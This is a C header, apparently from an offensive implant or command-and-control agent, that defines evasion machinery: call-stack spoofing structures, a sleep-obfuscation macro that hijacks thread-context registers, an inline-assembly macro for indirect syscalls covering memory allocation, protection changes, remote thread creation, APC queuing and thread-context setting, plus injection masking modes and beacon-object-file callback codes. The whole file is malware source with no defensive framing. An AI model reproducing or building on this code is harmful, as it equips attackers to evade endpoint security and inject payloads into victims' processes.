#ifndef EVASION_H
#define EVASION_H

struct _STACK_FRAME {
    WCHAR* DllPath;
    ULONG  Offset;
    ULONG  TotalSize;
    BOOL   ReqLoadLib;
    BOOL   SetsFramePtr;
    PVOID  ReturnAddress;
    BOOL   PushRbp;
    ULONG  CountOfCodes;
    BOOL   PushRbpIdx;
};
typedef _STACK_FRAME STACK_FRAME;

#define OBF_JMP( i, p ) \
    if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {   \
        Ctx[i].Rax = (U_PTR)( p );                 \
    } if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) { \
        Ctx[i].Rbx = (U_PTR)( & p );               \
    } else {                                       \
        Ctx[i].Rip = (U_PTR)( p );                 \
    }

/* ======== [ Syscalls ] ======== */

#define SY_SEED   0xEDB88320
#define SY_UP     -12
#define SY_DOWN   12
#define SY_RANGE  0xE5

typedef enum Sys {
    Alloc,
    Protect,
    Write,
    Read,
    Free,
    CrThread,
    QueueApc,
    OpenThrd,
    OpenProc,
    MapView,
    CrSectn,
    OpenPrToken,
    OpenThToken,
    SetCtxThrd,
    GetCtxThrd,
    Last
};

typedef struct {
    ULONG ssn;
    ULONG Hash;
    UPTR  Address;
    UPTR  Instruction;
} EXT, *PEXT;

#define SyscallExec( x, y, ... ) \
Self->Sys->Index = x; \
asm volatile (  \
    "push r14\n\t" \
    "push r15\n\t" \
    "mov r14, %0\n\t"  \
    "mov r15, %1\n\t"  \
    : \
    : "r" (&Self->Sys->Ext[Self->Sys->Index].ssn), "r" (&Self->Sys->Ext[Self->Sys->Index].Instruction) \
    : "memory" \
); \
asm("int3"); \
y = ExecSyscall( __VA_ARGS__ ); \
asm volatile ( \
    "pop r15\n\t" \
    "pop r14\n\t" \
); \

EXTERN_C __fastcall NTSTATUS ExecSyscall( ... );

/* ======== [ Injection ] ======== */

enum {
    MaskTimer = 1,
    MaskApc,
    MaskWait
} KH_MASK;

enum Reg {
    eRax,
    eRsi,
    eRbx = 0x23
};

/* ========= [ Coff ] ========= */

#define COFF_VAR 0x10
#define COFF_FNC 0x20
#define COFF_IMP 0x30

#define CALLBACK_OUTPUT      0x0
#define CALLBACK_OUTPUT_OEM  0x1e
#define CALLBACK_OUTPUT_UTF8 0x20
#define CALLBACK_ERROR       0x0d
#define CALLBACK_CUSTOM      0x1000
#define CALLBACK_CUSTOM_LAST 0x13ff

#endif // EVASION_H